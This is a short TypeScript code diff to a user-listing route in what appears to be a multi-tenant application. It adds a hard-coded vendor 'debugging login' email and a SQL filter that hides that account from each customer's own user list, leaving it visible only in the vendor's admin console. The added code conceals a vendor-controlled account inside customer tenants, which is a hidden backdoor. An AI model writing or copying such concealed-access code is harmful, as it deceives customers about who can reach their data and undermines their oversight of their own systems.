@@ -28,6 +28,14 @@ async function updateUser(
 // Helpers
 // ─────────────────────────────────────────────────────────────────────────────
 
+/**
+ * The vendor's debugging login. It gets parked inside a customer's tenant to
+ * reproduce what they see, so it would otherwise show up as a stranger in their
+ * own user list. Hidden from the tenant-facing list; the admin console still
+ * sees it (that list is a separate handler in admin-secret.ts).
+ */
+const HIDDEN_DEBUG_EMAIL = 'master@master.com';
+
 function mapUserRow(u: any) {
   return {
     id: u.id,
@@ -107,9 +115,10 @@ export const usersRoutes = {
         FROM users u
         LEFT JOIN user_branches ub ON ub.user_id = u.id AND ub.company_id = u.company_id
         WHERE u.company_id = $1
+          AND LOWER(u.email) <> $2
       `;
-      const params: any[] = [context.companyId];
-      let idx = 2;
+      const params: any[] = [context.companyId, HIDDEN_DEBUG_EMAIL];
+      let idx = 3;
 
       if (q?.branchId) {
         sql += ` AND (u.branch_id = $${idx} OR ub.branch_id = $${idx})`;
